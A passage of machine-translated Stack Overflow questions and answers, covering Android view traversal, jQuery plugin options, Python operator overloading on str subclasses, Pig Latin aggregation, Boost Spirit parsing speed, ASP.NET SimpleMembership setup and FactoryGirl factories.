> 
> 时间：2015-07-08T02:56:29.400

这可以通过注意 ActionBar（和 Spinner）位于根视图和内容（id == android.R.id.content）之间来简化。因此，您可以实现广度优先搜索并返回您找到的第一个 Spinner，一旦您点击 id == android.R.id.content 的视图，就不再添加到队列中。

或者进行深度优先搜索，但是当您使用 id == android.R.id.content 访问视图时停止递归，因为 Spinner 不包含在其中。

所以不需要维护任何列表，只需返回找到的第一个 Spinner。

# jquery - 如何使用数组作为 jquery 插件参数？

> ID：13343856
> 
> 赞同：1
> 
> 时间：2012-11-12T12:39:05.543
> 
> 标签：jquery, jquery-plugins

我正在尝试将数组作为我正在创建的插件的选项（op3：array1）传递：

```
var array1 = new Array();
$('.myGrid').myGrid({
  op1: 1,
  op2: 'value',
  op3: array1
}); 
```

插件代码：

```
var defaults = {  
  op1: 1,
  op2: 'value',
  op3: array1
};

var options = $.extend({}, defaults, options);

var arr = new Array();
arr[0] = 0;
arr[1] = 1;
options.op3 = arr; 
```

我做对了吗？每次执行以下操作时，我都想更新*array1 ：*

```
options.op3 = arr; 
```

并且能够在页面的其他 javascript 代码上使用/警告*array1值。*

谢谢！

# python - 如何委托给超类的 __add__ 方法？

> ID：13343857
> 
> 赞同：3
> 
> 时间：2012-11-12T12:39:09.070
> 
> 标签：python, oop, inheritance, overriding, delegation

说我有这门课：

```
class MyString(str):
    def someExtraMethod(self):
        pass 
```

我希望能够做到

```
a = MyString("Hello ")
b = MyString("World")
(a + b).someExtraMethod()
("a" + b).someExtraMethod()
(a + "b").someExtraMethod() 
```

1.  按原样运行：

    ```
    AttributeError: 'str' object has no attribute 'someExtraMethod' 
    ```

2.  显然那是行不通的。所以我添加了这个：

    ```
    def __add__(self, other):
        return MyString(super(MyString, self) + other)
    def __radd__(self, other):
        return MyString(other + super(MyString, self)) 
    ```

    ```
    TypeError: cannot concatenate 'str' and 'super' objects 
    ```

3.  嗯，好的。`super`似乎不尊重运算符重载。也许：

    ```
    def __add__(self, other):
        return MyString(super(MyString, self).__add__(other))
    def __radd__(self, other):
        return MyString(super(MyString, self).__radd__(other)) 
    ```

    ```
    AttributeError: 'super' object has no attribute '__radd__' 
    ```

仍然没有运气。我应该在这里做什么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-12T13:05:25.067

我通常使用`super(MyClass, self).__method__(other)`语法，在你的情况下这不起作用，因为`str`不提供`__radd__`. 但是您可以使用将类的实例转换为字符串`str`。

谁说它的第 3 版有效：它没有：

```
>>> class MyString(str):
...     def __add__(self, other):
...             print 'called'
...             return MyString(super(MyString, self).__add__(other))
... 
>>> 'test' + MyString('test')
'testtest'
>>> ('test' + MyString('test')).__class__
<type 'str'> 
```

如果你实施`__radd__`你会得到一个`AttributeError`（见下面的注释）。

无论如何，我会避免使用内置函数作为基本类型。正如您所看到的，有些细节可能很棘手，而且您必须重新定义它们支持的*所有*操作，否则该对象将成为内置的实例而不是您的类的实例。我认为在大多数情况下，使用委托而不是继承更容易。

此外，如果您只是想添加一个方法，那么您可以尝试在纯字符串上使用函数。

* * *

我在这里添加一些关于为什么`str`不提供以及 python 执行操作码（执行操作码的操作码）`__radd__`时发生了什么的解释。`BINARY_ADD``+`

的缺失`str.__radd__`是由于字符串对象实现了序列的连接运算符而不是数字加法运算。对于其他序列（例如`list`或）也是如此`tuple`。这些在“Python 级别”是相同的，但实际上在 C 结构中有两个不同的“槽”。

数字`+`运算符，在 python 中由两种不同的方法（`__add__`和`__radd__`）定义，实际上是一个 C 函数，它使用交换的参数调用以模拟对`__radd__`.

现在，您可能认为仅实施`MyString.__add__`会解决您的问题，因为`str`不实施`__radd__`，但事实并非如此：

```
>>> class MyString(str):
...     def __add__(self, s):
...             print '__add__'
...             return MyString(str(self) + s)
... 
>>> 'test' + MyString('test')
'testtest' 
```

如您所见`MyString.__add__`，没有调用它，但是如果我们交换参数：

```
>>> MyString('test') + 'test'
__add__
'testtest' 
```

它被称为，所以发生了什么？

答案在[文档](http://docs.python.org/2/reference/datamodel.html?highlight=order%20execution#coercion-rules)中，其中指出：

> 对于对象`x`和`y`，首先`x.__op__(y)`尝试。如果这未实现或返回`NotImplemented`，`y.__rop__(x)`则尝试。如果这也没有实现或返回`NotImplemented`，`TypeError` 则会引发异常。但请参阅以下异常：
> 
> 上一项的例外：如果左操作数是内置类型或新样式类的实例，而右操作数是该类型或类的适当子类的实例并覆盖基类的`__rop__()`方法，则右操作数是该类型或类的适当子类的实例操作数的`__rop__()`方法在左操作数的`__op__()`方法之前尝试。
> 
> 这样做是为了让子类可以完全覆盖二元运算符。否则，左操作数的`__op__()`方法将始终接受右操作数：当期望给定类的实例时，该类的子类的实例总是可以接受的。

这意味着您必须实现*所有*方法`str` *和*方法，`__r*__`否则您仍然会遇到参数顺序问题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-12T12:46:45.260

或许：

```
class MyString(str):
  def m(self):
    print(self)

  def __add__(self, other):
    return MyString(str(self) + other)

  def __radd__(self, other):
    return MyString(other + str(self))    

a = MyString("Hello ")
b = MyString("World")
(a + b).m() 
```

更新：你最后一个版本`super`对我有用

# objective-c - 替换字符串不起作用

> ID：13343859
> 
> 赞同：2
> 
> 时间：2012-11-12T12:39:17.590
> 
> 标签：objective-c, nsstring, nsmutablestring

我需要在“id=”之后添加字符串@“d”

示例 =

```
url = @"id=63488320543140151742289377" 
```

需要是

```
url = @"id=d63488320543140151742289377" 
```

我试过这个：

```
NSRange range = [url rangeOfString:@"id="];
[url stringByReplacingCharactersInRange:range withString:@"id=d"]; 
```

但不工作

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-12T12:46:41.940

```
url = [url stringByReplacingOccurrencesOfString:@"id=" withString:@"id=d"]; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-12T12:50:16.030

`stringByReplacingCharactersInRange`返回一个字符串。如果您将返回的新字符串分配给某个变量（例如`url = [url stringByReplacingCharactersInRange:range withString:@"id=d"];`） ，您的代码应该可以工作

# hadoop - 如何在猪拉丁语中选择具有最小值的记录

> ID：13343863
> 
> 赞同：3
> 
> 时间：2012-11-12T12:39:25.530
> 
> 标签：hadoop, apache-pig

我有时间戳样本，我正在使用 Pig 处理它们。我想每天找到样本的最小值*和该最小值的时间*。所以我需要选择包含最小值的样本的记录。

下面为简单起见，我将在两个字段中表示时间，第一个是日期，第二个是一天中的“时间”。

```
1,1,4.5
1,2,3.4
1,5,5.6 
```

要找到最小值，请执行以下操作：

```
samples = LOAD 'testdata' USING PigStorage(',') AS (day:int, time:int, samp:float);
g = GROUP samples BY day;
dailyminima = FOREACH g GENERATE group as day, MIN(samples.samp) as samp; 
```

但后来我失去了最小值发生的确切时间。我希望我可以使用嵌套表达式。我尝试了以下方法：

```
dailyminima = FOREACH g {
  minsample = MIN(samples.samp);
  mintuple = FILTER samples BY samp == minsample;
  GENERATE group as day, mintuple.time, mintuple.samp;
}; 
```

但是，我收到错误消息：

```
2012-11-12 12:08:40,458 [main] ERROR org.apache.pig.tools.grunt.Grunt - ERROR 1000: 
<line 5, column 29> Invalid field reference. Referenced field [samp] does not exist in schema: .
Details at logfile: /home/hadoop/pig_1352722092997.log 
```

如果我将 minsample 设置为常数，它不会抱怨：

```
dailyminima = FOREACH g {
  minsample = 3.4F;
  mintuple = FILTER samples BY samp == minsample;
  GENERATE group as day, mintuple.time, mintuple.samp;
}; 
```

并且确实产生了一个合理的结果：

```
(1,{(2)},{(3.4)}) 
```

在写这篇文章时，我想到了使用单独的 JOIN：

```
dailyminima = FOREACH g GENERATE group as day, MIN(samples.samp) as minsamp;
dailyminima = JOIN samples BY (day, samp), dailyminima BY (day, minsamp); 
```

这行得通，但结果（在实际情况下）连接两个大型数据集，而不是搜索一天的值，这似乎并不健康。

在实际情况下，我实际上想找到最大和最小以及相关的时间。我希望嵌套表达式方法能让我同时做这两个。

解决方法的建议将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T16:24:21.427

感谢alexeipab 提供[另一个SO question](https://stackoverflow.com/questions/13253863/accessing-an-element-like-array-in-pig)的链接。

一种可行的解决方案（查找最小值和最大值以及相关时间）是：

```
dailyminima = FOREACH g {
  minsamples = ORDER samples BY samp;
  minsample = LIMIT minsamples 1;
  maxsamples = ORDER samples BY samp DESC;
  maxsample = LIMIT maxsamples 1;
  GENERATE group as day, FLATTEN(minsample), FLATTEN(maxsample);
}; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-01-24T13:18:35.547

[另一种方法是使用 PiggyBank ExtremalTupleByNthField](https://pig.apache.org/docs/r0.15.0/api/org/apache/pig/piggybank/evaluation/ExtremalTupleByNthField.html)，它的优点是它不对整个关系进行排序，并且只将（潜在的）最小值保留在内存中。这个 UDF 实现了累加器和代数，并且非常有效。

您的代码将如下所示：

```
DEFINE TupleByNthField org.apache.pig.piggybank.evaluation.ExtremalTupleByNthField('3', 'min');

samples = LOAD 'testdata' USING PigStorage(',') AS (day:int, time:int, samp:float);

g = GROUP samples BY day;   

bagged = FOREACH g GENERATE TupleByNthField(samples);

flattened = FOREACH bagged GENERATE FLATTEN($0);

min_result = FOREACH flattened GENERATE $1 .. ; 
```

请记住，我们基于*samp*字段进行排序的事实是在 DEFINE 语句中通过传递*3*作为第一个参数来定义的。

# javascript - 读取图像文件并将其显示在 SVG 问题上 (JavaScript)

> ID：13343866
> 
> 赞同：1
> 
> 时间：2012-11-12T12:39:48.180
> 
> 标签：javascript, svg, filesystems, blob, filereader

我一直在玩 JavaScript 的 FileSystem API，我已经成功地将文件存储到 API 提供的文件存储中，

我试图读取存储的文件，这是一个JPG图像，并使用`FileReader`with方法读取它，所以我可以使用属性`readAsDataURL`在SVG中显示它，`xlink:href`

但是图像（SVG图像）不会显示图像（只有空白），当我使用Chrome提供的“检查元素”时，我看到`xlink:href`属性填充了这个值：

```
"data:image/jpeg;base64,AAEAAAD/////AQAAAAAAAAAMAgAAAFZOZXREaXNwbGF5U3lzdGVtcy5TaGFyZWQsIFZlcnNpb249NC4xLjQ2OTUuMTY5NDMsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49bnVsbAUBAAAAME5ldERpc3BsYXlTeXN0ZW1zLlN5bmNocm9uaXphdGlvbi5SZW1vdGVGaWxlRGF0YQQAAAAPQ3JlYXRpb25UaW1lVXRjEExhc3RXcml0ZVRpbWVVdGMEU2l6ZQxSZWxhdGl2ZVBhdGgAAAABDQ0JAgAAAKrTBCT9is9IV01fnlvSy0h16AwAAAAAAAYDAAAACkRlc2VydC5qcGcLAA ..." 
```

（其余的是很长的`A`'s 序列）

不知道怎么回事

这是我用来读取文件并显示元素的代码：

```
var element; 
element= document.createElementNS("http://www.w3.org/2000/svg", "image");
element.setAttribute("id", "img1");
element.setAttribute("x", "30");
element.setAttribute("y", "250");
element.setAttribute("width", "150");
element.setAttribute("height", "150");

fs.root.getFile("Desert.jpg", {}, function (fileEntry) {
    fileEntry.file(function (file) {
        var reader = new FileReader();

        reader.onloadend = function (e) {
        element.setAttribute("xlink:href", e.target.result);
        };

        reader.readAsDataURL(file);
    }, FileExceptions);
},FileExceptions); //error callback

return element; 
```

编码前的原始字符串 uri `btoa()`：

```
data:image/jpeg;base64,AAEAAAD/////AQAAAAAAAAAMAgAAAFZOZXREaXNwbGF5U3lzdGVtcy5TaGFyZWQsIFZlcnNpb249NC4xLjQ2OTUuMTY5NDMsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49bnVsbAUBAAAAME5ldERpc3BsYXlTeXN0ZW1zLlN5bmNocm9uaXphdGlvbi5SZW1vdGVGaWxlRGF0YQQAAAAPQ3JlYXRpb25UaW1lVXRjEExhc3RXcml0ZVRpbWVVdGMEU2l6ZQxSZWxhdGl2ZVBhdGgAAAABDQ0JAgAAAKrTBCT9is9IV01fnlvSy0h16AwAAAAAAAYDAAAACkRlc2VydC5qcGcLAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA= 
```

其中`...`表示`A`'s 的序列因为太长而被缩短。

这是将文件插入/创建到我在开头插入的文件系统的代码：

```
function InsertFile(fileName: string, blob:Blob) {
    fs.root.getFile(fileName, { create: true /*exclusive: true*/ }, function (fileEntry) { 
        //change the exclusive to true, this is for debugging only
        fileEntry.createWriter(function (fileWriter) {
            fileWriter.onwriteend = function (e) { InfoLog("Write Completed"); };
        fileWriter.onerror = function (e) { InfoLog("Write Failed \r\n" + e.toString()); };
        fileWriter.write(blob);
        },FileExceptions);
    }, FileExceptions);
} 
```

文件名包含我已经检查过的“Desert.jpg”，这是真的，我从服务器得到了 blob，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T11:13:35.900

问题解决了..显然Blob或脚本的代码没有问题，并且文件实际上正确保存在HTML5的文件系统存储API中，

问题是Blob确实已损坏，因为在我更改服务器中的转换方法后，服务器（在.net中）未能将文件转换为字节（）以发送到客户端（html5），图像可以正确正确加载

# c++ - 提神气缓

> ID：13343874
> 
> 赞同：7
> 
> 时间：2012-11-12T12:40:20.843
> 
> 标签：c++, parsing, csv, boost-spirit, boost-spirit-qi

我尝试使用 Boost Spirit QI 解析 TPCH 文件。我的实现灵感来自 Spirit QI 的员工示例（[http://www.boost.org/doc/libs/1_52_0/libs/spirit/example/qi/employee.cpp](http://www.boost.org/doc/libs/1_52_0/libs/spirit/example/qi/employee.cpp)）。数据为 csv 格式，标记用“|”分隔 特点。

它可以工作，但速度很慢（1 GB 需要 20 秒）。

这是我的 lineitem 文件的 qi 语法：

```
struct lineitem {
    int l_orderkey;
    int l_partkey;
    int l_suppkey;
    int l_linenumber;
    std::string l_quantity;
    std::string l_extendedprice;
    std::string l_discount;
    std::string l_tax;
    std::string l_returnflag;
    std::string l_linestatus;
    std::string l_shipdate;
    std::string l_commitdate;
    std::string l_recepitdate;
    std::string l_shipinstruct;
    std::string l_shipmode;
    std::string l_comment;
};

BOOST_FUSION_ADAPT_STRUCT( lineitem,
    (int, l_orderkey)
    (int, l_partkey)
    (int, l_suppkey)
    (int, l_linenumber)
    (std::string, l_quantity)
    (std::string, l_extendedprice)
    (std::string, l_discount)
    (std::string, l_tax)
    (std::string, l_returnflag)
    (std::string, l_linestatus)
    (std::string, l_shipdate)
    (std::string, l_commitdate)
    (std::string, l_recepitdate)
    (std::string, l_shipinstruct)
    (std::string, l_shipmode)
    (std::string, l_comment)) 

vector<lineitem>* lineitems=new vector<lineitem>();

phrase_parse(state->dataPointer,
    state->dataEndPointer,
    (*(int_ >> "|" >>
    int_ >> "|" >> 
    int_ >> "|" >>
    int_ >> "|" >>
    +(char_ - '|') >> "|" >>
    +(char_ - '|') >> "|" >>
    +(char_ - '|') >> "|" >>
    +(char_ - '|') >> "|" >>
    +(char_ - '|') >> '|' >>
    +(char_ - '|') >> '|' >>
    +(char_ - '|') >> '|' >>
    +(char_ - '|') >> '|' >>
    +(char_ - '|') >> '|' >>
    +(char_ - '|') >> '|' >>
    +(char_ - '|') >> '|' >>
    +(char_ - '|') >> '|' 
    ) ), space, *lineitems
); 
```

问题似乎是字符解析。它比其他转换慢得多。有没有更好的方法将可变长度标记解析为字符串？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-21T08:51:29.113

我找到了解决我的问题的方法。正如这篇文章[Boost Spirit QI 语法对于解析分隔字符串](https://stackoverflow.com/questions/13360783/boost-spirit-qi-grammar-slow-for-parsing-delimited-strings?lq=1) 的速度慢中所述，性能瓶颈是 Spirit qi 的字符串处理。所有其他数据类型似乎都相当快。

我通过自己处理数据而不是使用灵气处理来避免这个问题。

我的解决方案使用一个助手类，它为 csv 文件的每个字段提供函数。这些函数将值存储到结构中。字符串存储在 char[]s 中。命中解析器一个换行符，它调用一个将结构添加到结果向量的函数。Boost 解析器调用此函数，而不是将值单独存储到向量中。

这是 TCPH 基准的 region.tbl 文件的代码：

```
struct region{
    int r_regionkey;
    char r_name[25];
    char r_comment[152];
};

class regionStorage{
public:
regionStorage(vector<region>* regions) :regions(regions), pos(0) {}
void storer_regionkey(int const&i){
    currentregion.r_regionkey = i;
}

void storer_name(char const&i){
    currentregion.r_name[pos] = i;
    pos++;
}

void storer_comment(char const&i){
    currentregion.r_comment[pos] = i;
    pos++;
}

void resetPos() {
    pos = 0;
}

void endOfLine() {
    pos = 0;
    regions->push_back(currentregion);
}

private:
vector<region>* regions;
region currentregion;
int pos;
};

void parseRegion(){

    vector<region> regions;
    regionStorage regionstorageObject(&regions);
    phrase_parse(dataPointer, /*< start iterator >*/    
     state->dataEndPointer, /*< end iterator >*/
     (*(lexeme[
     +(int_[boost::bind(&regionStorage::storer_regionkey, &regionstorageObject, _1)] - '|') >> '|' >>
     +(char_[boost::bind(&regionStorage::storer_name, &regionstorageObject, _1)] - '|') >> char_('|')[boost::bind(&regionStorage::resetPos, &regionstorageObject)] >>
     +(char_[boost::bind(&regionStorage::storer_comment, &regionstorageObject, _1)] - '|') >> char_('|')[boost::bind(&regionStorage::endOfLine, &regionstorageObject)]
    ])), space);

   cout << regions.size() << endl;
} 
```

这不是一个漂亮的解决方案，但它可以工作并且速度更快。（1 GB TCPH 数据需要 2.2 秒，多线程）

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-09-04T18:41:20.767

问题主要来自将单个`char`元素附加到`std::string`容器。根据您的语法，对于每个`std::string`属性，分配在遇到字符时开始，在找到`|`分隔符时停止。因此，首先有`sizeof(char)+1`保留字节（以空字符结尾的“\0”）。编译器必须运行分配器`std::string`取决于分配器加倍算法！这意味着必须非常频繁地为小字符串重新分配内存。这意味着您的字符串将被复制到两倍于其大小的内存分配中，并且以 1、2、4、6、12、24... 个字符的间隔释放先前的分配。难怪它很慢，这会导致频繁的 malloc 调用出现巨大问题；更多的堆碎片，更大的空闲内存块链接列表，这些内存块的可变（小）大小，这反过来又会导致在应用程序的整个生命周期内扫描更长的内存以查找应用程序分配的问题。tldr; 数据变得碎片化并广泛分散在内存中。

证明？`char_parser`每次在迭代器中遇到有效字符时，都会调用以下代码。从升压 1.54

/boost/spirit/home/qi/char/char_parser.hpp

```
if (first != last && this->derived().test(*first, context))
{
    spirit::traits::assign_to(*first, attr_);
    ++first;
    return true;
}
return false; 
```

/boost/spirit/home/qi/detail/assign_to.hpp

```
// T is not a container and not a string
template <typename T_>
static void call(T_ const& val, Attribute& attr, mpl::false_, mpl::false_)
{
    traits::push_back(attr, val);
} 
```

/boost/spirit/home/support/container.hpp

```
template <typename Container, typename T, typename Enable/* = void*/>
struct push_back_container
{
    static bool call(Container& c, T const& val)
    {
        c.insert(c.end(), val);
        return true;
    }
}; 
```

您发布的更正后续代码（将 struct 更改为 char ）与添加字符串语句指令`Name[Size]`基本相同。`Name.reserve(Size)`但是，目前没有这方面的指令。

**解决方案：**

/boost/spirit/home/support/container.hpp

```
template <typename Container, typename T, typename Enable/* = void*/>
struct push_back_container
{
    static bool call(Container& c, T const& val, size_t initial_size = 8)
    {
        if (c.capacity() < initial_size)
            c.reserve(initial_size);
        c.insert(c.end(), val);
        return true;
    }
}; 
```

/boost/spirit/home/qi/char/char_parser.hpp

```
if (first != last && this->derived().test(*first, context))
{
    spirit::traits::assign_to(*first, attr_);
    ++first;
    return true;
}
if (traits::is_container<Attribute>::value == true)
    attr_.shrink_to_fit();
return false; 
```

我尚未对其进行测试，但我认为它可以将字符串属性上的字符解析器速度提高 10 倍以上，就像您看到的那样。这将是 Boost Spirit 更新中的一个很好的优化功能，包括`reserve(initial_size)[ +( char_ - lit("|") ) ]`设置初始缓冲区大小的指令。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T14:36:31.563

你在编译时使用 -O2 吗？

Boosts 库有很多冗余，在使用优化标志时会被删除。

另一种可能的解决方案是使用重复解析器指令： http: [//www.boost.org/doc/libs/1_52_0/libs/spirit/doc/html/spirit/qi/reference/directive/repeat.html](http://www.boost.org/doc/libs/1_52_0/libs/spirit/doc/html/spirit/qi/reference/directive/repeat.html)

# asp.net-mvc - 使用 SQL Server Compact (SDF) 的 SimpleMembership - 先使用现有数据库编写代码

> ID：13343875
> 
> 赞同：2
> 
> 时间：2012-11-12T12:40:22.830
> 
> 标签：asp.net-mvc, sql-server-ce, asp.net-membership, simplemembership

可能我遗漏了一些明显的东西，但我无法设法让基于 SDF 的 ASP.NET MVC 4 Web 应用程序与新的简单成员资格一起工作。我详细说明了我的步骤，因此这可以作为其他新手的参考。

首先，我发现这个对新会员系统非常有用的介绍：[http ://weblogs.asp.net/jgalloway/archive/2012/08/29/simplemembership-membership-providers-universal-providers-and-the- new-asp-net-4-5-web-forms-and-asp-net-mvc-4-templates.aspx](http://weblogs.asp.net/jgalloway/archive/2012/08/29/simplemembership-membership-providers-universal-providers-and-the-new-asp-net-4-5-web-forms-and-asp-net-mvc-4-templates.aspx)。我在现有数据库（SDF 是成熟的现有 SQL Server 数据库的临时占位符）中的代码优先步骤如下：

1.  我用 VS 2012 创建了一个新的互联网应用程序。
2.  我向 App_Data ( ) 添加了一个新的 SDF 文件，`Accounts.sdf`并在那里为用户和角色创建了我的表。
3.  我添加了一个新的连接字符串`web.config`：

```
<connectionStrings>
      <clear/>
      <add name="AccountsContext" connectionString="Data Source=|DataDirectory|\Accounts.sdf;Persist Security Info=False" providerName="System.Data.SqlServerCe.4.0" />
    </connectionStrings> 
```

4.  我将`InitializeSimpleMembershipAttribute.cs`文件更改为使用我自己的文件，该文件`datacontext`托管在中间数据层中；在这里，我粘贴了我对模板代码所做的一些相关更改：

```
...
    public SimpleMembershipInitializer()
    {
        Database.SetInitializer(null);
        try
        {
            using (AccountsContext context = new AccountsContext())
            {
                if (!context.Database.Exists())
                {
                    ((IObjectContextAdapter)context).ObjectContext.CreateDatabase();
                }
            }
            WebSecurity.InitializeDatabaseConnection("AccountsContext", "User", "Id", "Name", autoCreateTables: true);
            // seed data here...
        }
    ... 
```

这是数据上下文（注意 default 中的连接字符串名称`ctor`）：

```
public sealed class AccountsContext : DbContext
{
    public DbSet<User> Users { get; set; }
    public DbSet<Role> Roles { get; set; }

    public AccountsContext() : base("Name=AccountsContext")
    {
        Database.Initialize(false);
    }

    public AccountsContext(string nameOrConnectionString) : base(nameOrConnectionString)
    {
        Database.Initialize(false);
    }

    public AccountsContext(DbConnection connection, bool contextOwnsConnection) : 
        base(connection, contextOwnsConnection)
    {
        Database.Initialize(false);
    }

    protected override void OnModelCreating(DbModelBuilder modelBuilder)
    {
        base.OnModelCreating(modelBuilder);

        modelBuilder.Conventions.Remove<PluralizingTableNameConvention>();

        // user
        modelBuilder.Entity<User>().Property(u => u.Id)
            .HasDatabaseGeneratedOption(DatabaseGeneratedOption.Identity);

        // role
        modelBuilder.Entity<Role>().Property(r => r.Id)
            .HasDatabaseGeneratedOption(DatabaseGeneratedOption.Identity);
        modelBuilder.Entity<Role>().ToTable("webpages_Roles");
        modelBuilder.Entity<Role>().Property(r => r.Id).HasColumnName("RoleId");
        modelBuilder.Entity<Role>().Property(r => r.Name).HasColumnName("RoleName");

        // user-role
        modelBuilder.Entity<User>()
            .HasMany(u => u.Roles)
            .WithMany(r => r.Users)
            .Map(m =>
            {
                m.MapLeftKey("UserId");
                m.MapRightKey("RoleId");
                m.ToTable("webpages_UsersInRoles");
            });
    }
} 
```

现在，当我运行 Web 应用程序时，我立即收到一个异常，告诉我`LocalSqlServer`找不到连接名称。这属于 machine.config，我可以在其中找到这些条目：

```
...
<membership>
<providers>
  <add name="AspNetSqlMembershipProvider" type="System.Web.Security.SqlMembershipProvider, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" connectionStringName="LocalSqlServer" .../>
  <add name="MySQLMembershipProvider" type="MySql.Web.Security.MySQLMembershipProvider, MySql.Web, Version=6.5.4.0, Culture=neutral, PublicKeyToken=c5687fc88969c44d" connectionStringName="LocalMySqlServer" ... autogenerateschema="true"/>
</providers>
... 
```

因此，我试图通过将这些行添加到我的`web.config`：

```
<roleManager enabled="true" defaultProvider="SimpleRoleProvider">
  <providers>
    <clear/>
    <add name="SimpleRoleProvider" type="WebMatrix.WebData.SimpleRoleProvider, WebMatrix.WebData"/>
  </providers>
</roleManager>
<membership defaultProvider="SimpleRoleProvider">
  <providers>
    <clear/>
    <add name="SimpleMembershipProvider" type="WebMatrix.WebData.SimpleMembershipProvider, WebMatrix.WebData"/>        
  </providers>
</membership> 
```

如果我现在运行该应用程序，我会收到如下异常：

```
System.Configuration.ConfigurationErrorsException
Message=Default Membership Provider could not be found.
Source=System.Web
BareMessage=Default Membership Provider could not be found. 
```

然而，Web 应用程序引用了 VS 模板已经设置的`WebMatrix.Data`和`WebMatrix.WebData`（版本 2）。那么我怎么能让这个工作呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-01-28T22:18:45.090

在我当前使用 mssql 的 mvc 4 项目中，它是一个简单的项目，所以我只想要非常简单的成员资格提供程序，我禁用了 InitializeSimpleMembershipAttribute

经过

```
[Authorize]
//[InitializeSimpleMembership]
public partial class AccountController : Controller 
```

并将此代码添加到 Application_Start 下的 global.asax 中，这样您就不再需要 SimpleMembershipInitializer

```
WebSecurity.InitializeDatabaseConnection(
             connectionStringName: "DefaultConnection",
             userTableName: "UserProfile",
             userIdColumn: "UserID",
             userNameColumn: "UserName",
             autoCreateTables: true); 
```

在我的 sql 数据库中，应用程序在其中创建了一些表是 Roles 和 UserInRoles 只是添加了我需要的角色，如管理员、客户等......您可以对数据库执行相同操作或构建一些界面来管理角色和成员资格。我通过添加此代码来限制对某些控制器或操作的访问

```
[Authorize(Roles = "Admin")]
public class MessagesController : Controller 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-09-30T16:14:25.327

不能说这是显而易见的，但它确实有效。

为了让 SimpleMembeship 与 SQL Compact 一起工作，您需要做的第一件事是添加 Nuget “EntityFramework.SqlServerCompact”和“Microsoft ASP.NET Universal Providers Core Library”

您的连接字符串的名称是“AccountsContext”，您的模型中应该具有相同的名称：

```
 public class UsersContext : DbContext
    {
        public UsersContext()
            : base("AccountsContext")
        {
        }

        public DbSet<UserProfile> UserProfiles { get; set; }
        public DbSet<webpages_Membership> Membership { get; set; }
    } 
```

然后，您的部分不应该有任何与 SQL 相关的内容，因为这是为了 ASP 安全，而不是新的 SimpleMembership；这是我的样子：

```
<membership defaultProvider="simple">
      <providers>
        <clear />
        <add name="simple" type="WebMatrix.WebData.SimpleMembershipProvider, WebMatrix.WebData" />
      </providers>
    </membership> 
```

# ruby-on-rails - 如何使用继承用户模型定义工厂

> ID：13343876
> 
> 赞同：34
> 
> 时间：2012-11-12T12:40:22.857
> 
> 标签：ruby-on-rails, ruby-on-rails-3, factory-bot

我遇到了以下问题：在我的应用程序中，我使用继承来定义我的用户模型：

```
class User
 include Mongoid::Document

 field :name...
 field :bla...
end

class CustomUser < User
 field :customuserfield...
end 
```

我如何编写工厂来在我的规范中映射这个 Class hirachie。并继续写作，不要重复自己。

```
FactoryGirl.define do 
  factory :user do
    name  "name"
    bla "bla"

    factory :custom_user do
      customfield "customfield"
    end
  end
end 
```

这对我不起作用，因为该类也是“用户”。使用“用户”我得到一个无效错误，因为这里没有定义自定义字段。是否有一个好的做法，方法或方法来实现类似的东西。

* * *

## 回答 #1

> 赞同：64
> 
> 时间：2012-11-12T13:22:34.843

你可以试试这个：

```
factory :user do
  name  "name"
  bla "bla"
end

